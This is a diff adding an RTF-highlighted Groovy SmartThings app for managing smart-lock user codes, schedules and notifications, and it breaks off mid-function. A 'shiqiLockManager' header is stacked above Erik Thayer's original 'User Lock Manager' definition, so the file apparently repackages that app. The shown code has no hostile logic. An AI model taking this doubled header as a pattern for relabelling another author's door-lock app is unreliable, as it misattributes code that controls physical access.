@@ -1,0 +1,1595 @@
+{\rtf1\ansi\deff0{\fonttbl{\f0\fmodern\fprq1\fcharset0;}}{\colortbl;\red64\green128\blue128;\red186\green33\blue33;\red153\green153\blue153;\red25\green23\blue124;\red0\green0\blue255;\red128\green0\blue128;\red187\green187\blue187;\red102\green102\blue102;\red136\green136\blue136;\red0\green128\blue0;\red170\green34\blue255;\red187\green102\blue34;\red187\green102\blue136;\red255\green0\blue0;\red0\green68\blue221;\red188\green122\blue0;\red0\green160\blue0;\red210\green65\blue58;\red0\green0\blue128;\red176\green0\blue64;\red125\green144\blue41;\red160\green0\blue0;\red136\green0\blue0;\red160\green160\blue0;}\f0{\cf1\i /**\par
+ *  shiqiLockManager\par
+ *\par
+ *  Copyright 2016 Yunhan Jia & Shiqi Wang\par
+ *\par
+ *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except\par
+ *  in compliance with the License. You may obtain a copy of the License at:\par
+ *\par
+ *      http://www.apache.org/licenses/LICENSE-2.0\par
+ *\par
+ *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed\par
+ *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License\par
+ *  for the specific language governing permissions and limitations under the License.\par
+ *\par
+ */}\par
+definition{\cf8 (}\par
+    {\cf24 name:} {\cf2 "shiqiLockManager"}{\cf8 ,}\par
+    {\cf24 namespace:} {\cf2 "wsq"}{\cf8 ,}\par
+    {\cf24 author:} {\cf2 "Yunhan Jia & Shiqi Wang"}{\cf8 ,}\par
+    {\cf24 description:} {\cf2 "This app allows you to change, delete, and schedule user access."}{\cf8 ,}\par
+    {\cf24 category:} {\cf2 "Safety & Security"}{\cf8 ,}\par
+    {\cf24 iconUrl:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png"}{\cf8 ,}\par
+    {\cf24 iconX2Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 ,}\par
+    {\cf24 iconX3Url:} {\cf2 "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png"}{\cf8 )}\par
+\par
+{\cf1\i /**\par
+ *  User Lock Manager v4.1.5\par
+ *\par
+ *  Copyright 2015 Erik Thayer\par
+ *  Keypad support added by BLebson\par
+ *  Door manual unlock notifications and option by DimitriRodis 2016-06-24\par
+ *\par
+ *\par
+ */}\par
+definition{\cf8 (}\par
+  {\cf24 name:} {\cf2 "User Lock Manager"}{\cf8 ,}\par
+  {\cf24 namespace:} {\cf2 "ethayer"}{\cf8 ,}\par
+  {\cf24 author:} {\cf2 "Erik Thayer"}{\cf8 ,}\par
+  {\cf24 description:} {\cf2 "This app allows you to change, delete, and schedule user access."}{\cf8 ,}\par
+  {\cf24 category:} {\cf2 "Safety & Security"}{\cf8 ,}\par
+  {\cf24 iconUrl:} {\cf2 "https://dl.dropboxusercontent.com/u/54190708/LockManager/lockmanager.png"}{\cf8 ,}\par
+  {\cf24 iconX2Url:} {\cf2 "https://dl.dropboxusercontent.com/u/54190708/LockManager/lockmanagerx2.png"}{\cf8 ,}\par
+  {\cf24 iconX3Url:} {\cf2 "https://dl.dropboxusercontent.com/u/54190708/LockManager/lockmanagerx3.png"}{\cf8 )}\par
+\par
+  {\cf10\b import} {\cf5\b groovy.json.JsonSlurper}\par
+  {\cf10\b import} {\cf5\b groovy.json.JsonBuilder}\par
+\par
+preferences {\cf8 \{}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "rootPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "setupPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "userPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "notificationPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "onUnlockPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "schedulingPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "calendarPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "resetAllCodeUsagePage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "resetCodeUsagePage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "reEnableUserPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "infoPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "keypadPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "infoRefreshPage"}{\cf8 )}\par
+  page{\cf8 (}{\cf24 name:} {\cf2 "lockInfoPage"}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 rootPage}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf1\i //reset errors on each load\par
+}  dynamicPage{\cf8 (}{\cf24 name:} {\cf2 "rootPage"}{\cf8 ,} {\cf24 title:} {\cf2 ""}{\cf8 ,} {\cf24 install:} {\cf10\b true}{\cf8 ,} {\cf24 uninstall:} {\cf10\b true}{\cf8 )} {\cf8 \{}\par
+\par
+    section{\cf8 (}{\cf2 "Which Locks?"}{\cf8 )} {\cf8 \{}\par
+      input {\cf2 "theLocks"}{\cf8 ,}{\cf2 "capability.lockCodes"}{\cf8 ,} {\cf24 title:} {\cf2 "Select Locks"}{\cf8 ,} {\cf24 required:} {\cf10\b true}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,} {\cf24 submitOnChange:} {\cf10\b true}\par
+    {\cf8 \}}\par
+\par
+    {\cf10\b if} {\cf8 (}theLocks{\cf8 )} {\cf8 \{}\par
+      initalizeLockData{\cf8 (}{\cf8 )}\par
+\par
+      section {\cf8 \{}\par
+        input {\cf24 name:} {\cf2 "maxUsers"}{\cf8 ,} {\cf24 title:} {\cf2 "Number of users"}{\cf8 ,} {\cf24 type:} {\cf2 "number"}{\cf8 ,} {\cf24 multiple:} {\cf10\b false}{\cf8 ,} {\cf24 refreshAfterSelection:} {\cf10\b true}{\cf8 ,} {\cf24 submitOnChange:} {\cf10\b true}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toSetupPage"}{\cf8 ,} {\cf24 title:} {\cf2 "User Settings"}{\cf8 ,} {\cf24 page:} {\cf2 "setupPage"}{\cf8 ,} {\cf24 description:} setupPageDescription{\cf8 (}{\cf8 )}{\cf8 ,} {\cf24 state:} setupPageDescription{\cf8 (}{\cf8 )} {\cf8 ?} {\cf2 "complete"} {\cf8 :} {\cf2 ""}{\cf8 )}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toInfoPage"}{\cf8 ,} {\cf24 page:} {\cf2 "infoPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Lock Info"}{\cf8 )}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toKeypadPage"}{\cf8 ,} {\cf24 page:} {\cf2 "keypadPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Keypad Info (optional)"}{\cf8 )}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toNotificationPage"}{\cf8 ,} {\cf24 page:} {\cf2 "notificationPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Notification Settings"}{\cf8 ,} {\cf24 description:} notificationPageDescription{\cf8 (}{\cf8 )}{\cf8 ,} {\cf24 state:} notificationPageDescription{\cf8 (}{\cf8 )} {\cf8 ?} {\cf2 "complete"} {\cf8 :} {\cf2 ""}{\cf8 )}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toSchedulingPage"}{\cf8 ,} {\cf24 page:} {\cf2 "schedulingPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Schedule (optional)"}{\cf8 ,} {\cf24 description:} schedulingHrefDescription{\cf8 (}{\cf8 )}{\cf8 ,} {\cf24 state:} schedulingHrefDescription{\cf8 (}{\cf8 )} {\cf8 ?} {\cf2 "complete"} {\cf8 :} {\cf2 ""}{\cf8 )}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toOnUnlockPage"}{\cf8 ,} {\cf24 page:} {\cf2 "onUnlockPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Global Hello Home"}{\cf8 )}\par
+      {\cf8 \}}\par
+      section {\cf8 \{}\par
+        label{\cf8 (}{\cf24 title:} {\cf2 "Label this SmartApp"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 defaultValue:} {\cf2 ""}{\cf8 )}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 setupPage}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  dynamicPage{\cf8 (}{\cf24 name:}{\cf2 "setupPage"}{\cf8 ,} {\cf24 title:}{\cf2 "User Settings"}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (}maxUsers {\cf8 >} {\cf8 0}{\cf8 )} {\cf8 \{}\par
+      section{\cf8 (}{\cf2 'Users'}{\cf8 )} {\cf8 \{}\par
+        {\cf8 (}{\cf8 1}{\cf8 .}{\cf8 .}{\cf21 maxUsers}{\cf8 )}{\cf8 .}{\cf21 each} {\cf8 \{} user{\cf8 -}{\cf8 >}\par
+          {\cf10\b if} {\cf8 (}{\cf8 !}state{\cf8 .}{\cf2 "userState$\{user\}"}{\cf8 )} {\cf8 \{}\par
+            {\cf1\i //there's no values, so reset\par
+}            resetCodeUsage{\cf8 (}user{\cf8 )}\par
+          {\cf8 \}}\par
+          {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userCode$\{user\}"} {\cf8 &}{\cf8 &} settings{\cf8 .}{\cf2 "userSlot$\{user\}"}{\cf8 )} {\cf8 \{}\par
+            getConflicts{\cf8 (}settings{\cf8 .}{\cf2 "userSlot$\{user\}"}{\cf8 )}\par
+          {\cf8 \}}\par
+          href{\cf8 (}{\cf24 name:} {\cf2 "toUserPage$\{user\}"}{\cf8 ,} {\cf24 page:} {\cf2 "userPage"}{\cf8 ,} {\cf24 params:} {\cf8 [}{\cf24 number:} user{\cf8 ]}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 description:} userHrefDescription{\cf8 (}user{\cf8 )}{\cf8 ,} {\cf24 title:} userHrefTitle{\cf8 (}user{\cf8 )}{\cf8 ,} {\cf24 state:} userPageState{\cf8 (}user{\cf8 )} {\cf8 )}\par
+        {\cf8 \}}\par
+      {\cf8 \}}\par
+      section {\cf8 \{}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toResetAllCodeUsage"}{\cf8 ,} {\cf24 title:} {\cf2 "Reset Code Usage"}{\cf8 ,} {\cf24 page:} {\cf2 "resetAllCodeUsagePage"}{\cf8 ,} {\cf24 description:} {\cf2 "Tap to reset"}{\cf8 )}\par
+      {\cf8 \}}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      section{\cf8 (}{\cf2 "Users"}{\cf8 )} {\cf8 \{}\par
+        paragraph {\cf2 "Users are set to zero.  Please go back to the main page and change the number of users to at least 1."}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 userPage}{\cf8 (}params{\cf8 )} {\cf8 \{}\par
+  dynamicPage{\cf8 (}{\cf24 name:}{\cf2 "userPage"}{\cf8 ,} {\cf24 title:}{\cf2 "User Settings"}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} i {\cf8 =} getUser{\cf8 (}params{\cf8 )}{\cf8 ;}\par
+\par
+    {\cf10\b if} {\cf8 (}{\cf8 !}state{\cf8 .}{\cf2 "userState$\{i\}"}{\cf8 .}{\cf21 enabled}{\cf8 )} {\cf8 \{}\par
+      section {\cf8 \{}\par
+        paragraph {\cf2 "WARNING:\\n\\nThis user has been disabled.\\nReason: $\{state."}userState${\cf8 \{}i{\cf8 \}}{\cf2 ".disabledReason\}"}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toreEnableUserPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Reset User"}{\cf8 ,} {\cf24 page:} {\cf2 "reEnableUserPage"}{\cf8 ,} {\cf24 params:} {\cf8 [}{\cf24 number:} i{\cf8 ]}{\cf8 ,} {\cf24 description:} {\cf2 "Tap to reset"}{\cf8 )}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+    {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userCode$\{i\}"} {\cf8 &}{\cf8 &} settings{\cf8 .}{\cf2 "userSlot$\{i\}"}{\cf8 )} {\cf8 \{}\par
+      {\cf20 def} conflict {\cf8 =} getConflicts{\cf8 (}settings{\cf8 .}{\cf2 "userSlot$\{i\}"}{\cf8 )}\par
+      {\cf10\b if} {\cf8 (}conflict{\cf8 .}{\cf21 has_conflict}{\cf8 )} {\cf8 \{}\par
+        section{\cf8 (}{\cf2 "Conflicts:"}{\cf8 )} {\cf8 \{}\par
+          theLocks{\cf8 .}{\cf21 each} {\cf8 \{} lock{\cf8 -}{\cf8 >}\par
+            {\cf10\b if} {\cf8 (}conflict{\cf8 .}{\cf2 "lock$\{lock.id\}"} {\cf8 &}{\cf8 &} conflict{\cf8 .}{\cf2 "lock$\{lock.id\}"}{\cf8 .}{\cf21 conflicts} {\cf8 !}{\cf8 =} {\cf8 [}{\cf8 ]}{\cf8 )} {\cf8 \{}\par
+              paragraph {\cf2 "$\{lock.displayName\} slot $\{fancyString(conflict."}lock${\cf8 \{}lock{\cf8 .}{\cf21 id}{\cf8 \}}{\cf2 ".conflicts)\}"}\par
+            {\cf8 \}}\par
+          {\cf8 \}}\par
+        {\cf8 \}}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+    section{\cf8 (}{\cf2 "Code #$\{i\}"}{\cf8 )} {\cf8 \{}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "userName$\{i\}"}{\cf8 ,} {\cf24 type:} {\cf2 "text"}{\cf8 ,} {\cf24 title:} {\cf2 "Name for User"}{\cf8 ,} {\cf24 defaultValue:} settings{\cf8 .}{\cf2 "userName$\{i\}"}{\cf8 )}\par
+      {\cf20 def} title {\cf8 =} {\cf2 "Code (4 to 8 digits)"}\par
+      theLocks{\cf8 .}{\cf21 each} {\cf8 \{} lock{\cf8 -}{\cf8 >}\par
+        {\cf10\b if} {\cf8 (}lock{\cf8 .}{\cf21 hasAttribute}{\cf8 (}{\cf2 'pinLength'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+          title {\cf8 =} {\cf2 "Code (Must be $\{lock.latestValue('pinLength')\} digits)"}\par
+        {\cf8 \}}\par
+      {\cf8 \}}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "userCode$\{i\}"}{\cf8 ,} {\cf24 type:} {\cf2 "text"}{\cf8 ,} {\cf24 title:} title{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 defaultValue:} settings{\cf8 .}{\cf2 "userCode$\{i\}"}{\cf8 ,} {\cf24 refreshAfterSelection:} {\cf10\b true}{\cf8 )}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "userSlot$\{i\}"}{\cf8 ,} {\cf24 type:} {\cf2 "number"}{\cf8 ,} {\cf24 title:} {\cf2 "Slot (1 through 30)"}{\cf8 ,} {\cf24 defaultValue:} preSlectedCode{\cf8 (}i{\cf8 )}{\cf8 )}\par
+    {\cf8 \}}\par
+    section {\cf8 \{}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "dontNotify$\{i\}"}{\cf8 ,} {\cf24 title:} {\cf2 "Mute entry notification?"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 defaultValue:} settings{\cf8 .}{\cf2 "dontNotify$\{i\}"}{\cf8 )}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "burnCode$\{i\}"}{\cf8 ,} {\cf24 title:} {\cf2 "Burn after use?"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 defaultValue:} settings{\cf8 .}{\cf2 "burnCode$\{i\}"}{\cf8 )}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "userEnabled$\{i\}"}{\cf8 ,} {\cf24 title:} {\cf2 "Enabled?"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 defaultValue:} settings{\cf8 .}{\cf2 "userEnabled$\{i\}"}{\cf8 )}\par
+      {\cf20 def} hhPhrases {\cf8 =} location{\cf8 .}{\cf21 getHelloHome}{\cf8 (}{\cf8 )}{\cf8 ?}{\cf8 .}{\cf21 getPhrases}{\cf8 (}{\cf8 )}{\cf8 *}{\cf8 .}{\cf21 label}\par
+      {\cf10\b if} {\cf8 (}hhPhrases{\cf8 )} {\cf8 \{}\par
+        hhPhrases{\cf8 .}{\cf21 sort}{\cf8 (}{\cf8 )}\par
+        input {\cf24 name:} {\cf2 "userHomePhrases$\{i\}"}{\cf8 ,} {\cf24 type:} {\cf2 "enum"}{\cf8 ,} {\cf24 title:} {\cf2 "Hello Home Phrase"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,}{\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 options:} hhPhrases{\cf8 ,} {\cf24 defaultValue:} settings{\cf8 .}{\cf2 "userHomePhrases$\{i\}"}{\cf8 ,} {\cf24 refreshAfterSelection:} {\cf10\b true}\par
+        input {\cf2 "userNoRunPresence$\{i\}"}{\cf8 ,} {\cf2 "capability.presenceSensor"}{\cf8 ,} {\cf24 title:} {\cf2 "Don't run Actions if any of these are present:"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 defaultValue:} settings{\cf8 .}{\cf2 "userNoRunPresence$\{i\}"} {\cf8 |}{\cf8 |} {\cf10\b false}\par
+        input {\cf2 "userDoRunPresence$\{i\}"}{\cf8 ,} {\cf2 "capability.presenceSensor"}{\cf8 ,} {\cf24 title:} {\cf2 "Run Actions only if any of these are present:"}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 defaultValue:} settings{\cf8 .}{\cf2 "userDoRunPresence$\{i\}"} {\cf8 |}{\cf8 |} {\cf10\b false}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+    section {\cf8 \{}\par
+      href{\cf8 (}{\cf24 name:} {\cf2 "toSetupPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Back To Users"}{\cf8 ,} {\cf24 page:} {\cf2 "setupPage"}{\cf8 )}\par
+      href{\cf8 (}{\cf24 name:} {\cf2 "toResetCodeUsagePage"}{\cf8 ,} {\cf24 title:} {\cf2 "Reset Code Usage"}{\cf8 ,} {\cf24 page:} {\cf2 "resetCodeUsagePage"}{\cf8 ,} {\cf24 params:} {\cf8 [}{\cf24 number:} i{\cf8 ]}{\cf8 ,} {\cf24 description:} {\cf2 "Tap to reset"}{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 preSlectedCode}{\cf8 (}i{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "userSlot$\{i\}"} {\cf8 !}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b return} settings{\cf8 .}{\cf2 "userSlot$\{i\}"}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf10\b return} i\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 notificationPage}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  dynamicPage{\cf8 (}{\cf24 name:} {\cf2 "notificationPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Notification Settings"}{\cf8 )} {\cf8 \{}\par
+\par
+    section {\cf8 \{}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "phone"}{\cf8 ,} {\cf24 type:} {\cf2 "text"}{\cf8 ,} {\cf24 title:} {\cf2 "Text This Number"}{\cf8 ,} {\cf24 description:} {\cf2 "Phone number"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 submitOnChange:} {\cf10\b true}{\cf8 )}\par
+      paragraph {\cf2 "For multiple SMS recipients, separate phone numbers with a semicolon(;)"}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "notification"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 title:} {\cf2 "Send A Push Notification"}{\cf8 ,} {\cf24 description:} {\cf2 "Notification"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 submitOnChange:} {\cf10\b true}{\cf8 )}\par
+      {\cf10\b if} {\cf8 (}phone {\cf8 !}{\cf8 =} {\cf10\b null} {\cf8 |}{\cf8 |} notification {\cf8 |}{\cf8 |} sendevent{\cf8 )} {\cf8 \{}\par
+        input{\cf8 (}{\cf24 name:} {\cf2 "notifyAccess"}{\cf8 ,} {\cf24 title:} {\cf2 "on User Entry"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+        input{\cf8 (}{\cf24 name:} {\cf2 "notifyLock"}{\cf8 ,} {\cf24 title:} {\cf2 "on Lock"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+        input{\cf8 (}{\cf24 name:} {\cf2 "notifyUnlock"}{\cf8 ,} {\cf24 title:} {\cf2 "on Unlock"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+        input{\cf8 (}{\cf24 name:} {\cf2 "notifyAccessStart"}{\cf8 ,} {\cf24 title:} {\cf2 "when granting access"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+        input{\cf8 (}{\cf24 name:} {\cf2 "notifyAccessEnd"}{\cf8 ,} {\cf24 title:} {\cf2 "when revoking access"}{\cf8 ,} {\cf24 type:} {\cf2 "bool"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+\par
+    section{\cf8 (}{\cf2 "Only During These Times (optional)"}{\cf8 )} {\cf8 \{}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "notificationStartTime"}{\cf8 ,} {\cf24 type:} {\cf2 "time"}{\cf8 ,} {\cf24 title:} {\cf2 "Notify Starting At This Time"}{\cf8 ,} {\cf24 description:} {\cf10\b null}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+      input{\cf8 (}{\cf24 name:} {\cf2 "notificationEndTime"}{\cf8 ,} {\cf24 type:} {\cf2 "time"}{\cf8 ,} {\cf24 title:} {\cf2 "Notify Ending At This Time"}{\cf8 ,} {\cf24 description:} {\cf10\b null}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 schedulingPage}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  dynamicPage{\cf8 (}{\cf24 name:} {\cf2 "schedulingPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Rules For Access Scheduling"}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (}{\cf8 !}days{\cf8 )} {\cf8 \{}\par
+      section {\cf8 \{}\par
+        href{\cf8 (}{\cf24 name:} {\cf2 "toCalendarPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Calendar"}{\cf8 ,} {\cf24 page:} {\cf2 "calendarPage"}{\cf8 ,} {\cf24 description:} calendarHrefDescription{\cf8 (}{\cf8 )}{\cf8 ,} {\cf24 state:} calendarHrefDescription{\cf8 (}{\cf8 )} {\cf8 ?} {\cf2 "complete"} {\cf8 :} {\cf2 ""}{\cf8 )}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+    {\cf10\b if} {\cf8 (}{\cf8 !}startDay {\cf8 &}{\cf8 &} {\cf8 !}startMonth {\cf8 &}{\cf8 &} {\cf8 !}startYear {\cf8 &}{\cf8 &} {\cf8 !}endDay {\cf8 &}{\cf8 &} {\cf8 !}endMonth {\cf8 &}{\cf8 &} {\cf8 !}endYear{\cf8 )} {\cf8 \{}\par
+      section {\cf8 \{}\par
+        input{\cf8 (}{\cf24 name:} {\cf2 "days"}{\cf8 ,} {\cf24 type:} {\cf2 "enum"}{\cf8 ,} {\cf24 title:} {\cf2 "Allow User Access On These Days"}{\cf8 ,} {\cf24 description:} {\cf2 "Every day"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 multiple:} {\cf10\b true}{\cf8 ,} {\cf24 options:} {\cf8 [}{\cf2 "Monday"}{\cf8 ,} {\cf2 "Tuesday"}{\cf8 ,} {\cf2 "Wednesday"}{\cf8 ,} {\cf2 "Thursday"}{\cf8 ,} {\cf2 "Friday"}{\cf8 ,} {\cf2 "Saturday"}{\cf8 ,} {\cf2 "Sunday"}{\cf8 ]}{\cf8 ,} {\cf24 submitOnChange:} {\cf10\b true}{\cf8 )}\par
+      {\cf8 \}}\par
+      section {\cf8 \{}\par
+        input{\cf8 (}{\cf24 name:} {\cf2 "modeStart"}{\cf8 ,} {\cf24 title:} {\cf2 "Allow Access when in this mode"}{\cf8 ,} {\cf24 type:} {\cf2 "mode"}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 mutliple:} {\cf10\b false}{\cf8 ,} {\cf24 submitOnChange:} {\cf10\b true}{\cf8 )}\par
+      {\cf8 \}}\par
+      section {\cf8 \{}\par
+        {\cf10\b if} {\cf8 (}modeStart{\cf8 )} {\cf8 \{}\par
+          input {\cf2 "andOrTime"}{\cf8 ,} {\cf2 "enum"}{\cf8 ,} {\cf24 title:} {\cf2 "[And/Or] at a set time?"}{\cf8 ,} {\cf24 metadata:}{\cf8 [}{\cf24 values:}{\cf8 [}{\cf2 "and"}{\cf8 ,} {\cf2 "or"}{\cf8 ]}{\cf8 ]}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 ,} {\cf24 submitOnChange:} {\cf10\b true}\par
+        {\cf8 \}}\par
+        {\cf10\b if} {\cf8 (}{\cf8 (}modeStart {\cf8 =}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 |}{\cf8 |} andOrTime{\cf8 )} {\cf8 \{}\par
+          input{\cf8 (}{\cf24 name:} {\cf2 "startTime"}{\cf8 ,} {\cf24 type:} {\cf2 "time"}{\cf8 ,} {\cf24 title:} {\cf2 "Start Time"}{\cf8 ,} {\cf24 description:} {\cf10\b null}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+          input{\cf8 (}{\cf24 name:} {\cf2 "endTime"}{\cf8 ,} {\cf24 type:} {\cf2 "time"}{\cf8 ,} {\cf24 title:} {\cf2 "End Time"}{\cf8 ,} {\cf24 description:} {\cf10\b null}{\cf8 ,} {\cf24 required:} {\cf10\b false}{\cf8 )}\par
+        {\cf8 \}}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 calendarPage}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  dynamicPage{\cf8 (}{\cf24 name:} {\cf2 "calendarPage"}{\cf8 ,} {\cf24 title:} {\cf2 "Calendar Access"}{\cf8 )} {\cf8 \{}\par
+    section{\cf8 (}{\cf8 )} {\cf8 \{}\par
+      paragraph {\cf2 "This page is for advanced users only. You must enter each field carefully."}\par
+      paragraph {\cf2 "Calendar use does not support daily grant/deny OR Modes.  You cannot both have a date here, and allow access only on certain days/modes."}\par
+    {\cf8 \}}\par
+    {\cf20 def} hhPhrases {\cf8 =} location{\cf8 .}{\cf21 getHelloHome}{\cf8 (}{\cf8 )}{\cf8 ?}{\cf8 .}{\cf21 getPhrases}{\cf8 (}{\cf8 )}{\cf8 *}{\cf8 .}{\cf21 label}\par
+    section{\cf8 (}{\cf2 "Start Date"}{\cf8 )} {\cf8 \{}\par
+      input {\cf24 name:} {\cf2 "startDay"}{\cf8 ,} {\cf24 type:} {\cf2 "number"}{\cf8 ,} {\cf24 title:} {\cf2 "Day"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+      input {\cf24 name:} {\cf2 "startMonth"}{\cf8 ,} {\cf24 type:} {\cf2 "number"}{\cf8 ,} {\cf24 title:} {\cf2 "Month"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+      input {\cf24 name:} {\cf2 "startYear"}{\cf8 ,} {\cf24 type:} {\cf2 "number"}{\cf8 ,} {\cf24 description:} {\cf2 "Format(yyyy)"}{\cf8 ,} {\cf24 title:} {\cf2 "Year"}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
+      input {\cf24 name:} {\cf2 "startTime"}{\cf8 ,} {\cf24 type:} {\cf2 "time"}{\cf8 ,} {\cf24 title:} {\cf2 "Start Time"}{\cf8 ,} {\cf24 description:} {\cf10\b null}{\cf8 ,} {\cf24 required:} {\cf10\b false}\par
